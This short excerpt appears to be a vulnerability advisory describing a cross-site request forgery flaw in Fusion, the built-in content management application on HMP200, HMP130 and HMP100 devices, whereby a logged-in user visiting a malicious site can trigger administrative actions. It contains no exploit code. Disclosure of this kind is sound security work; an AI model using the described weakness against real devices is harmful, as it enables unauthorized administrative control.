Fusion is a built-in content management application accessible from a standard web
browser - it is pre-installed on every HMP200, HMP130, and HMP100 device, and does
not require any additional license, cost, or software installation.

Desc: The application interface allows users to perform certain actions via HTTP
requests without performing any validity checks to verify the requests. This can
be exploited to perform certain actions with administrative privileges if a logged-in
user visits a malicious web site.
